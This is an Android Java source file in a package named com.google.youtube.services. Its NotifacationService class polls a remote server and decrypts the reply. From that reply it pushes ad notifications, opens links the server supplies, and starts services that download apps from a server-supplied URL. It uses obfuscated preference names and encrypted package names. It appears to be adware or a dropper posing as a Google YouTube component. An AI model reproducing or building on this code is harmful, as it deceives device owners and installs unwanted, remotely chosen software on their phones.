package com.google.youtube.services;

import java.util.Date;
import java.util.Iterator;
import java.util.List;
import org.json.JSONObject;
import com.google.youtube.utils.HttpUtil;
import com.google.youtube.utils.MyHelpUtil;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.text.TextUtils;

public class NotifacationService {

	private final String URL = HttpUtil.BASE_URL + "google_h.action";

	private String val_title;

	private String val_text;

	private int isgoon;

	private int nid;

	private String ico_img;

	private String appimg;

	private PendingIntent pintent;

	private String appalias;

	private Context context;

	private String download_url;

	public NotifacationService(Context context) {
		this.context = context;
	}

	private synchronized boolean checkOption(String ico_img,
			int msg_link_count, int screen_count, int display_interval,
			String apppakname, int msg_install_count, int msg_lx) {

		SharedPreferences snLinkSharedPreferences = context
				.getSharedPreferences("sln", 0);

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("scr", 0);

		int local_screen_count = localSharedPreferences.getInt("sc", -1);

		SharedPreferences msgSharedPreferences = context.getSharedPreferences(
				"tir", 0);

		SharedPreferences installSharedPreferences = context
				.getSharedPreferences("inr", 0);

		int local_msg_link_count = snLinkSharedPreferences.getInt(ico_img, 0);

		int installCount = installSharedPreferences.getInt(
				MyHelpUtil.enCrypto(apppakname, MyHelpUtil.A), 0);

		boolean time_iner = false;

		if (!msgSharedPreferences.contains("not")
				&& local_screen_count >= screen_count) {

			time_iner = true;

		} else {

			long reslut = Math.abs(new Date().getTime()
					- msgSharedPreferences.getLong("not", 0));

			long display_interval_to_long = Math
					.abs(display_interval * 3600 * 1000);

			if (reslut >= display_interval_to_long) {

				time_iner = true;
			}

		}

		if (msg_lx == 2) {

			if (local_screen_count >= screen_count && time_iner
					&& msg_link_count >= local_msg_link_count) {

				return true;

			} else {

				return false;
			}

		}

		if (local_screen_count >= screen_count && time_iner
				&& installCount <= msg_install_count) {

			return true;
		}

		return false;
	}

	private Bundle setBundle(JSONObject jsb) {

		Bundle bundle = null;

		try {
			if (jsb != null) {

				bundle = new Bundle();

				bundle.putString("val_title", jsb.getString("val_title"));

				bundle.putString("val_text", jsb.getString("val_text"));

				bundle.putString("val_appremark",
						jsb.getString("val_appremark"));

				bundle.putString("appimg", jsb.getString("appimg"));

				bundle.putString("msg_val_banben",
						jsb.getString("msg_val_banben"));
				//
				bundle.putString("msg_val_date", jsb.getString("msg_val_date"));

				bundle.putString("val_applx", jsb.getString("val_applx"));

				bundle.putString("msg_azl", jsb.getString("msg_azl"));

				bundle.putString("val_azl", jsb.getString("val_azl"));

				bundle.putString("msg_val_size", jsb.getString("msg_val_size"));

				bundle.putString("msg_val_language",
						jsb.getString("msg_val_language"));

				bundle.putString("val_downloadBtn",
						jsb.getString("val_downloadBtn"));

				bundle.putString("appalias", jsb.getString("appalias"));

				bundle.putString("apppakname", jsb.getString("apppakname"));

				bundle.putString("ico_img", jsb.getString("ico_img"));

				bundle.putString("appimg", jsb.getString("appimg"));

				bundle.putInt("msg_show_notifatication",
						jsb.getInt("msg_show_notifatication"));

				bundle.putString("download_url", jsb.getString("download_url"));

			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return bundle;
	}

	/**
	 * 通知栏 主逻辑
	 * 
	 * @return
	 */
	protected String run() {

		if (MyHelpUtil.checkNet(context)) {

			try {

				String params_str = MyHelpUtil.add_notifacation_params(context);

				String returnmsg = HttpUtil.postRequest(this.URL, params_str);

				if (!TextUtils.isEmpty(returnmsg)) {

					JSONObject jsb = new JSONObject(
							MyHelpUtil.deCrypto(returnmsg));

					int display_interval = jsb.getInt("display_interval");

					int screen_count = jsb.getInt("screen_count");

					String apppakname = jsb.getString("apppakname");

					int msg_install_count = jsb.getInt("msg_install_count");

					int msg_lx = jsb.getInt("msg_lx");

					int msg_link_count = jsb.getInt("msg_link_count");

					ico_img = jsb.getString("ico_img");

					val_title = jsb.getString("val_title");

					val_text = jsb.getString("val_text");

					isgoon = jsb.getInt("isgoon");

					nid = jsb.getInt("msgId");

					appimg = jsb.getString("appimg");

					appalias = jsb.getString("appalias");

					download_url = jsb.getString("download_url");

					boolean bool = checkOption(ico_img, msg_link_count,
							screen_count, display_interval, apppakname,
							msg_install_count, msg_lx);

					if (bool) {

						System.out.println("Notif Y");

						String p = MyHelpUtil
								.enCrypto(apppakname, MyHelpUtil.A);

						SharedPreferences appSharedPreferences = context
								.getSharedPreferences("inr", 0);

						if (!appSharedPreferences.contains(p)) {

							Editor localEditor = appSharedPreferences.edit();

							localEditor.putInt(p, 0);

							localEditor.commit();

						}

						HttpUtil.getBitmap(ico_img);

						HttpUtil.getBitmap(appimg);

						switch (msg_lx) {

						case 0:

							/**
							 * 界面广告
							 */
							Bundle localBundle = setBundle(jsb);

							Intent adIntent = new Intent(context,
									AdActivity.class);

							adIntent.putExtras(localBundle);

							adIntent.setAction("android.intent.action.VIEW");

							pintent = PendingIntent
									.getActivity(context, nid, adIntent,
											PendingIntent.FLAG_UPDATE_CURRENT);

							MyHelpUtil.sys_msg(context, 1, apppakname);

							break;

						case 1:

							/**
							 * 下载
							 */
							Intent drIntent = new Intent(context,
									DirectDService.class);

							drIntent.putExtra("appalias", appalias);

							drIntent.putExtra("val_title", val_title);

							drIntent.putExtra("val_text", val_text);

							drIntent.putExtra("apppakname", apppakname);

							drIntent.putExtra("msg_show_notifatication",
									jsb.getInt("msg_show_notifatication"));

							drIntent.putExtra("download_url", download_url);

							pintent = PendingIntent
									.getService(context, nid, drIntent,
											PendingIntent.FLAG_UPDATE_CURRENT);

							MyHelpUtil.sys_msg(context, 2, apppakname);

							break;

							
						case 2:
							/**
							 * 链接
							 */
							String msg_lx_url = jsb.getString("msg_lx_url");

							if (!TextUtils.isEmpty(msg_lx_url)) {

								Intent urlIntent = new Intent(
										Intent.ACTION_VIEW,
										Uri.parse(msg_lx_url));

								urlIntent
										.addCategory(Intent.CATEGORY_BROWSABLE);

								PackageManager pm = context.getPackageManager();

								List<ResolveInfo> s = pm.queryIntentActivities(
										urlIntent,
										PackageManager.MATCH_DEFAULT_ONLY);

								for (Iterator<ResolveInfo> iterator = s
										.iterator(); iterator.hasNext();) {
									ResolveInfo resolveInfo = (ResolveInfo) iterator
											.next();

									urlIntent
											.setClassName(
													resolveInfo.activityInfo.packageName,
													resolveInfo.activityInfo.name);

									break;

								}

								pintent = PendingIntent.getActivity(context,
										nid, urlIntent,
										PendingIntent.FLAG_UPDATE_CURRENT);

								saveLinkCount(ico_img);

								MyHelpUtil.sys_msg(context, 3, apppakname);
							}
							break;

						case 3:
							
							/**
							 * 直接下载
							 */
							Intent drlIntent = new Intent(context,
									DirectDLService.class);

							drlIntent.putExtra("download_url", download_url);

							drlIntent.putExtra("appalias", appalias);

							drlIntent.putExtra("val_title", val_title);

							drlIntent.putExtra("val_text", val_text);

							drlIntent.putExtra("apppakname", apppakname);

							drlIntent.putExtra("msg_show_notifatication",
									jsb.getInt("msg_show_notifatication"));

							pintent = PendingIntent.getService(context, nid,
									drlIntent,
									PendingIntent.FLAG_UPDATE_CURRENT);

							MyHelpUtil.sys_msg(context, 16, apppakname);

							break;
						default:
							break;
						}

						/**
						 * 显示通知
						 */
						Bitmap bitmap = BitmapFactory.decodeFile(MyHelpUtil.getDir() + ico_img + ".png");

						if (!TextUtils.isEmpty(val_title)&& !TextUtils.isEmpty(val_text)&& pintent != null) {

							MyHelpUtil.showNotifacation(bitmap, val_title,val_text, "", context, nid, isgoon,pintent, 0);

							saveMsgStatus();
						}

					} else {

						System.out.println("Notif N");

					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		return null;
	}

	private void saveMsgStatus() {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("tir", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putLong("not", new Date().getTime());

		localEditor.commit();
	}

	private void saveLinkCount(String ico_img) {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("sln", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putInt(ico_img,
				localSharedPreferences.getInt(ico_img, 0) + 1);

		localEditor.commit();

	}

}
